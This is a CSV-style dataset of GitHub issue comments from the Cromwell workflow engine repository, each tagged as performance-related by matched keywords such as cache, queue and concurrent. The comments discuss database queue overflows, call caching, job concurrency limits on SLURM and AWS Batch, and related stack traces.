Performance,"Unlike the stacktrace suggests this is not specifically related to the `refreshMetadataSummaryEntries`, it's just a consequence of the slick queue being overflowed.; See https://github.com/slick/slick/issues/1183 and https://github.com/slick/slick/issues/1683",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2182#issuecomment-294986870:141,queue,queue,141,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2182#issuecomment-294986870,1,['queue'],['queue']
Performance,"Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-6/execution/5.txt.copy""]; }, {; ""left"": 8,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/8.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-7/execution/8.txt.copy""]; }, {; ""left"": 9,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/9.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-8/execution/9.txt.copy""]; }, {; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/2.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-9/execution/2.txt.copy""],; ""left"": 10; }]; },; ""id"": ""67295907-5ffe-486e-8c7d-2bfdc5c5f97d""; }; ```. This results are always the same between runs. It looks more like a problem in the way that the maps are handled, either one or both of this:. * `read_map` initializes an unsorted map, which does not preserve the file order when scatter is performed; * Scatter a map does not preserve the order of iteration, even if the `read_map` maintains the insertion order. I am not sure if in a `Map` the order is supposed to be preserved, but it would be nice in the case something like this toy-script works to keep an ordered map. I can work around this by using two files in `GenerateMap` (one for the numbers and one for the files), read both with `read_lines` and then `zip` both of them to return an `Array[Pair[Int, File]]` instead of a map. Nevertheless, I think that this would be nicer if it works out-of-the-box (e.g., maintaining order of map from a file).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368445779:4375,perform,performed,4375,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368445779,1,['perform'],['performed']
Performance,"Using raw SQL query which uses table join to find match in the prefix hints:. <img src=""https://user-images.githubusercontent.com/16748522/47813043-4d472400-dd20-11e8-9181-49d45fc56425.png"" width=""50%"" height=""50%"">. Legend:; Blue line- the query checks whether a call cache entry exists for the base aggregation hash; Orange line- the query retrieves 1 call cache entry matching the base aggregation hash and input files aggregation hash. Same database as above was used.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4266#issuecomment-434814687:269,cache,cache,269,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4266#issuecomment-434814687,2,['cache'],['cache']
Performance,"Using raw SQL query with multiple OR conditions to find match in the prefix hints:. <img src=""https://user-images.githubusercontent.com/16748522/47726893-c6b41900-dc31-11e8-9d33-3120309fb152.png"" width=""50%"" height=""50%"">. Legend:; Blue line- the query checks whether a call cache entry exists for the base aggregation hash; Orange line- the query retrieves 1 call cache entry matching the base aggregation hash and input files aggregation hash. The database against which the queries were executed has following row count (Call Caching related tables):; CALL_CACHING_AGGREGATION_ENTRY: 102543; CALL_CACHING_DETRITUS_ENTRY: 615258; CALL_CACHING_ENTRY: 102543; CALL_CACHING_HASH_ENTRY: 4818285; CALL_CACHING_SIMPLETON_ENTRY: 1011390",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4266#issuecomment-434334361:275,cache,cache,275,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4266#issuecomment-434334361,2,['cache'],['cache']
Performance,"Verified as working now. However @jsotobroad - your example matrix rotator will need to use `Array[Array[File]]` not `Array[Array[String]]` (on both input and output), otherwise it will never call cache",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/832#issuecomment-220715450:197,cache,cache,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/832#issuecomment-220715450,1,['cache'],['cache']
Performance,"Was there a solution to this? I am also encountering this using the broad institute mutect2 implementation here:; https://github.com/broadinstitute/gatk/blob/master/scripts/mutect2_wdl/mutect2.wdl. When implemented using slurm/singularity on my institute's HPC. Specifically my error is below and I think has to do like people above have said to do the 50 scatter I am currently using. `[INFO] [06/04/2024 06:56:15.291] [cromwell-system-akka.dispatchers.engine-dispatcher-32] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor] WorkflowManagerActor: Workflow ccfe50af-5661-4bcd-b351-9da287c5affb failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardAsyncExecutionActor$$anon$2: Failed to evaluate job outputs:; Bad output 'M2.tumor_pileups': Future timed out after [60 seconds]; Bad output 'M2.normal_pileups': Future timed out after [60 seconds]; Bad output 'M2.tumor_sample': Failed to read_string(""tumor_name.txt"") (reason 1 of 1): Future timed out after [60 seconds]; Bad output 'M2.normal_sample': Failed to read_string(""normal_name.txt"") (reason 1 of 1): Future timed out after [60 seconds]; 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$handleExecutionSuccess$1(StandardAsyncExecutionActor.scala:990); 	at scala.concurrent.impl.Promise$Transformation.run(Promise.scala:467); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107)`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-2147918932:1286,concurren,concurrent,1286,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-2147918932,1,['concurren'],['concurrent']
Performance,"We also ran for a while and got extra `glob` folders in our paths via the workflow options:. ```json; {; ""final_workflow_outputs_dir"": ""xxx"",; ""use_relative_output_paths"": true; }; ```. For anyone running their instances on a fork, or if someone wants to ask the Cromwell devs to see if this is a breaking change, on our instance I briefly tried out modifying [this line](https://github.com/broadinstitute/cromwell/blob/87/engine/src/main/scala/cromwell/engine/workflow/lifecycle/finalization/CopyWorkflowOutputsActor.scala#L124):. ```scala; lazy val truncateRegex = "".*/call-[^/]*/(shard-[0-9]+/)?(cacheCopy/)?(attempt-[0-9]+/)?(execution/)?"".r; ```. to:. ```scala; lazy val truncateRegex = "".*/call-[^/]*/(shard-[0-9]+/)?(cacheCopy/)?(attempt-[0-9]+/)?(execution/)?(glob-[0-9a-f]+/)?"".r; ```. It seemed to work, removing the glob folder from files copied into xxx. However, I ultimately pursued a different implementation. Using a customized external tool, we now only copy outputs reported as `File` or `Directory` by the `/describe` endpoint, which we are already using for validation.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5524#issuecomment-2113647854:599,cache,cacheCopy,599,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5524#issuecomment-2113647854,2,['cache'],['cacheCopy']
Performance,"We are facing a similar issue when using the SLURM backend. It appears as if cromwell is limiting the number of jobs to a particular number of concurrent jobs, which is below the number specified by the `concurrent-job-limit` parameter. For example, when running a scatter task with 25 jobs, only 6 are started and the rest are started after these jobs are complete (the resources on the server are sufficient to run all 25). ; I have looked at all the possible issues that come to mind - including:; 1. Using the less CPU intensive call caching strategy (""fingerprint""), which instantly checks for a match in call cache. ; 2. Assigning all jobs a default hog group value ""static"" and setting the hog factor to 1. ; 3. Setting the `concurrent-job-limit` to a very high value (2000 in our case).; 4. I think I/O is not a problem, as the jobs are run almost instantly (including call caching checks and hard-linking) and then cromwell waits with execution of the rest until the first ones are complete. The CPU and RAM utilization of cromwell are low at all times. ; 5. This is seen with single and multiple workflows so the `max-concurrent-workflows` does not appear to be the problematic setting here. . Despite trying everything, we still only see about 25% of jobs being run concurrently. Is there another setting I am missing? Any input is much appreaciated - thank you!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5218#issuecomment-651055688:143,concurren,concurrent,143,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5218#issuecomment-651055688,6,"['cache', 'concurren']","['cache', 'concurrent', 'concurrent-job-limit', 'concurrent-workflows', 'concurrently']"
Performance,"We are ready to submit PR with fix for this issue and we performed manual testing on several backends (AWS, GCP, Local), but there are some troubles with creation of integration test for that: in particular, we didn't find the way to pass cromwell options to cromwell running in server mode. Is this possible and is integration test required for this issue? @wleepang",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4982#issuecomment-519482385:57,perform,performed,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4982#issuecomment-519482385,1,['perform'],['performed']
Performance,"We feel this is another in a long series of weird concurrency issues which we see from time to time involving shared filesystems and fs synching. We've never been able to reliably reproduce these, but if someone can provide something here we can reopen and look at it",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1959#issuecomment-519647059:50,concurren,concurrency,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1959#issuecomment-519647059,1,['concurren'],['concurrency']
Performance,"We have the same issue; we use an OGE back-end that implements hard limits on resource utilization which will terminate jobs that exceed these limits without allowing them to create an rc file. Currently we are running local mode cromwell instances with a workaround of putting a time-limit on the cromwell task of 48 hours, but this is extremely wasteful of our back end resources (cromwell itself consumes a large amount of memory on our cluster nodes). Our current workarounds involve putting a soft-limit on each job, attempting to trap SIGUSR1 in advance of the job being killed by the queue manager, at which point they create an rc file with a non-zero error code, but there is no guarantee that we can catch every instance of this. . Ideally we would like for cromwell to query running jobs at a user configurable interval (optionally never, but not as often as the file system is pinged for rc files so as not to burden the scheduler) against its list of jobs that are both not finished, and running and at minimum trigger the equivalent error state of a non-zero rc file return code. . We experience this problem frequently (and expect it to increase as we move more pipelines to cromwell) because our pipelines can not reliably estimate the amount of memory they need for tasks apriori.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-359006150:591,queue,queue,591,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-359006150,1,['queue'],['queue']
Performance,"We have users with the same use case as the second paragraph: ""most of your workflow worked well but fails in the end. You figure out the problem and you do not want to start it from the very beginning as intermediate results are already recorded to the Cromwell-execution folder"". More specifically, the harder case is when you have a scatter (say 100 way wide) and 98 succeed, but the other two fail. You figure out what changes to your command/docker that would fix this and you want to resume those with this change. Since Cromwell would only rerun for these failed tasks it wouldn't cause call caching confusion (rerun the succeeded tasks again), and these new runs would call cache to different hashes than had the original cached. If you were to run this same workflow again with the same data, those 98 that succeeded would not be able to call cache because you changed your task or docker, but I feel this is fine.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2023#issuecomment-360594970:682,cache,cache,682,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2023#issuecomment-360594970,3,['cache'],"['cache', 'cached']"
Performance,"We recently adjusted this timeout, I would try again with the latest `develop` build. The errors are likely happening because Cromwell is putting work into its IO queue faster than it can finish it. There's a backpressure system that aims to prevent this by stopping Cromwell picking up new work when IO operations aren't getting finished fast enough, but in this case it isn't responsive enough to keep you out of trouble. If you continue seeing these errors, you can tune down `system.io.command-backpressure-staleness` to make the engine more sensitive to long IO queues.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-2296872912:163,queue,queue,163,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-2296872912,3,"['queue', 'tune']","['queue', 'queues', 'tune']"
Performance,"We would like to use small page sizes to make this query performant, say 10 workflows per page. We will also be submitting ~10 workflows per second sometimes, so the number of pages could easily change between the first and second request, and we'd end up getting the next to last page instead of the last one.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3947#issuecomment-417346160:57,perform,performant,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3947#issuecomment-417346160,1,['perform'],['performant']
Performance,"We're trying to run on HPC cluster and would prefer to lower the load on the filesystem as much as possible. If we use any of the hashing based caching mechanisms, it hits the filesystem hard which tends to slow everything down. Our production is currently running with ""fingerprint"" and hardlink with singularity containers. The samba mounts on the nodes can do 2Gbps and my cromwell server instance maxes it out pretty much right away. On top of that, doing that much IO over a GPFS mount lead to an increase in GPFS buffer size which balooned enough to kill cromwell server process. We'd like to use ""path+modtime"", so we'd prefer a softlink option. We tested this internally and it works as long as the target location is mounted within the singularity containers at the same location. We also think that cromwell should let the users softlink if they so choose, perhaps with a warning if they're running containers.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040380663:65,load,load,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040380663,1,['load'],['load']
Performance,We're using lifecycle policy on GCS buckets to automatically remove all data older than 2 days. That seems to work fine. We calculated that the cost of our workflows is equal to the cost of keeping the intermediate data for ~10 days in Regional storage (so it is cheaper to re-calculate everything than to restore it from cache after 10 days). So here we're just agreeing to pay ~20% overhead.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1292#issuecomment-417436977:322,cache,cache,322,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1292#issuecomment-417436977,1,['cache'],['cache']
Performance,"Well if it's doing it only when the job is finished I would even make it `warn` instead of `info`. > Right now a workflow is not robust enough to run it on a/our HPC, see also on gitte:; > Peter van 't Hof @ffinfo Aug 26 19:05; > ye I see what you mean but it's the only way. When in SGE your job is killed he never get to the point of $? > rc; > so cromwell can not detect is a job is killed, meaning it will end in a endless loop polling for rc what never will come anymore; > in this case a drmaa connection would be better; > but not so sure if that still works on a start of a server; > I think there it's bound to a session; > ; > Peter van 't Hof @ffinfo Aug 26 19:11; > but only have seen the dmraa implementation inside Gatk Queue; > ; > Peter van 't Hof @ffinfo Aug 26 19:28; > when using qstat i would use it only once for the complete pool instead executing it for each job; > so then you get an output like this:; > `; > job-ID prior name user state submit/start at queue slots ja-task-ID; > 9923549 0.00000 cromwell_1 pjvan_thof qw 08/26/2016 17:23:16 1; > 9923550 0.00000 cromwell_1 pjvan_thof qw 08/26/2016 17:23:16 1; > `; > this is only 2 jobs but having a lot of jobs this will reduce the load a lot; > ; > kshakir @kshakir Aug 26 21:21; > True, Cromwell will end up in an endless loop if someone terminates the SGE job, or if the rc file doesn’t appear in general. One could use isAlive intermittently, but it was introduced mainly for recovering jobs at re-startup, & I would not have isAlive poll as often as we check for the rc file. Btw, GATK Queue actually only checks drmaa every 30 seconds, so that it doesn’t overload dispatchers. Something like isAlive could be checked with similar frequency. All this is a bigger discussion that could be tracked in a git issue.; > Separately, I am hearing from multiple people that the rc poll logs are spam. ; > ; > Peter van 't Hof @ffinfo Aug 26 21:44; > As already suggested in the PR, a actor pool would be better I think but that'",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-242961348:734,Queue,Queue,734,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-242961348,2,"['Queue', 'queue']","['Queue', 'queue']"
Performance,"Well nevermind, this does not seem to help, still seeing ; ```; Exceeded configured max-open-requests value of [128]. This means that the request queue of this pool (HostConnectionPoolSetup(localhost,...; ```. We might want to increase the `max-open-requests` conf setting instead ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3801#issuecomment-399141015:146,queue,queue,146,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3801#issuecomment-399141015,1,['queue'],['queue']
Performance,"Were you able to test whether the move from `runTransaction` to `runAction` affects performance?. Apologies if you already shared this at yesterday's refinement, I was still on vacation.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4508#issuecomment-451263303:84,perform,performance,84,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4508#issuecomment-451263303,1,['perform'],['performance']
Performance,"What @danbills said. It's a probabilistic data structure which can tell you either ""I've probably seen this before"" or ""I've definitely *not* seen this before"" in a very space & time efficient manner. So in a case like this where there are a lot of misses we could use it to do a quick ""should I even bother hitting the DB"" sanity test. . I'd want to see that this is actually a bottleneck before proceeding, this was just an idea I had that I wanted to keep around for memory's sake in case we do see it be a bottleneck.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2248#issuecomment-332244385:379,bottleneck,bottleneck,379,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2248#issuecomment-332244385,2,['bottleneck'],['bottleneck']
Performance,"What is the recommendation for resolving this problem?; I am getting the following:. ```; {; u'status': u'fail',; u'message': u'Task slick.basic.BasicBackend$DatabaseDef$$anon$2@2dbcf781 rejected from slick.util.AsyncExecutor$$anon$2$$anon$1@6dbdf3be[Running, pool size = 20, active threads = 20, queued tasks = 1000, completed tasks = 550175]'; }; ```. when calling the `query` endpoint.; It happens episodically. If I call `query` again, it often responds just fine. I'm particularly curious about the message indicating:. ```; queued tasks = 1000; ```. There is not much going on with this instance:. ```; $ curl http://localhost:8000/engine/v1/stats; {""workflows"":24,""jobs"":115}. $ curl http://localhost:8000/engine/v1/version; {""cromwell"":""33-215cca9-SNAP""}; ```. How should I interpret having 1000 queued tasks?. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2182#issuecomment-394779329:297,queue,queued,297,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2182#issuecomment-394779329,3,['queue'],['queued']
Performance,"What kind of concurrency (what concurrent-job-limit did you use) have you, @wleepang, and @TimurIs, been able to achieve using the `job-rate-control` stuff? I'm just curious.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-443022098:13,concurren,concurrency,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-443022098,2,['concurren'],"['concurrency', 'concurrent-job-limit']"
Performance,"When Cromwell submits a job to AWS Batch it actually makes about 3-4 API requests, so hitting the API request limit can happen quickly. The following specification in the application conf is a workaround:; ```; concurrent-job-limit = 16; ```. Is this not working for you?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-433163629:211,concurren,concurrent-job-limit,211,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-433163629,1,['concurren'],['concurrent-job-limit']
Performance,With the rate throttled BOTH the jobDefinition errors AND the Too Many Requests errors have both been eliminated for a workflow that has 133 independent shards. However severe throttling of the job rate seems like something you need to be presented with up front as this only is acceptable for long running jobs with independent processes.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4496#issuecomment-469868742:14,throttle,throttled,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4496#issuecomment-469868742,1,['throttle'],['throttled']
Performance,"With udocker running in proot vs Singularity running in chroot, some HPC performance/IB/GPUcapability issues might occur in this route.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-358345068:73,perform,performance,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-358345068,1,['perform'],['performance']
Performance,"Won't compile:. > [error] /Users/chrisl/IdeaProjects/cromwell/src/main/scala/cromwell/instrumentation/Instrumentation.scala:20: value getConfigOption is not a member of com.typesafe.config.Config; > [error] private val Config = ConfigFactory.load.getConfigOption(""instrumentation""); > [error] ^; > [error] one error found; > [error](compile:compileIncremental) Compilation failed",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/344#issuecomment-166862524:242,load,load,242,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/344#issuecomment-166862524,1,['load'],['load']
Performance,"Won't the `invalidate-bad-cache-results` setting work for you? It's not a timeout, it just tells Cromwell to gracefully handle missing files when attempting to retrieve from the cache. Seems to work pretty well in my hands (we have a similar situation here so I actually wrote a test for this).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5174#issuecomment-530831145:26,cache,cache-results,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5174#issuecomment-530831145,2,['cache'],"['cache', 'cache-results']"
Performance,"Worker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.AllelicCNV:10:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.PlotACNVResults:6:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(Act",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:6959,concurren,concurrent,6959,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,Would it be possible to have the Workflow ID / Call FQN of the call that was used as a cache in the metadata ?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/585#issuecomment-198468831:87,cache,cache,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/585#issuecomment-198468831,1,['cache'],['cache']
Performance,"Yeah I'm not sure I understand how this is the problem, it looks like as soon as we get an `IoFailure` we change state and get to `Failing`, where we just wait for the rest of the IO responses but don't send anything else to the EJEA. Since it looks like we create one of this per cache hit I don't see how this actor can keep sending ""JobFailed"" messages multiple times",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4085#issuecomment-420355576:281,cache,cache,281,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4085#issuecomment-420355576,1,['cache'],['cache']
Performance,"Yeah I've been following that! I'm excited to try it soon, and I think it'll knock out a good chunk of CPU when it's copying files between disks, but the `cached-copy` strategy hard links files, which means it's not eligible for any other call-caching strategy except File.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4945#issuecomment-507871439:155,cache,cached-copy,155,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4945#issuecomment-507871439,1,['cache'],['cached-copy']
Performance,Yeah and we can fall back to try another cache hit if one is available. @geoffjentry feel free to leave the totem on my desk.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2347#issuecomment-307426337:41,cache,cache,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2347#issuecomment-307426337,1,['cache'],['cache']
Performance,"Yeah, it's all of them - because all of them check the cache hit UUID and will fail if it's not the expected value. I'll take a look and see if there's a good way to prevent retries for these test formats in general. I agree that depending on people to add the flag to each test file is not great, but it seems nice for debugging - if you're wondering why a test didn't retry, this is the first place you'd look.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1022241403:55,cache,cache,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1022241403,1,['cache'],['cache']
Performance,"Yeah, that's the easy part :). Honestly a reasonable Definition Of Done could be ""all docs and the renaming of the reflectively loaded class(es)"" as the real problem is our user facing stuff - it's starting to cause confusion, but we might as well go all the way at that point.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2019#issuecomment-321536662:128,load,loaded,128,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2019#issuecomment-321536662,1,['load'],['loaded']
Performance,"Yes -- my original comment was because of the inability to remove files created via refresh token. I think then you asked why FireCloud couldn't implement the delete functionality themselves... which they could but that seems brittle and better to centralize (e.g. they would have to crawl the metadata, evict things from the cache, etc).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1292#issuecomment-329038021:326,cache,cache,326,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1292#issuecomment-329038021,1,['cache'],['cache']
Performance,"Yes but we should be very, very careful with describing performance improvements so as not to create unreasonable expectations.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5112#issuecomment-520597689:56,perform,performance,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5112#issuecomment-520597689,1,['perform'],['performance']
Performance,"Yes that's correct, sorry I didn't see you are building from a docker uri. . I don't think there exists the exact functionality you want, but we are getting there. The current cache support is for docker layers, which will save you download time, but you still would rebuild from them each time. I think it would be worth the effort to ask for what you need. Take a look at the [latest release](https://github.com/sylabs/singularity/releases) that has some support for caching (for library images). Then I would open an issue and say something about it - you want the same caching but for docker pulled containers. This particular flow to pull (or build) and honor a cached image if it exists is very common and reasonable, and should be supported.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-463867477:176,cache,cache,176,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-463867477,2,['cache'],"['cache', 'cached']"
Performance,"Yes this looks right - we also want to iterate over every possible cached file, just try on each until we hopefully find a hit we have permissions on",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1587#issuecomment-254313101:67,cache,cached,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1587#issuecomment-254313101,1,['cache'],['cached']
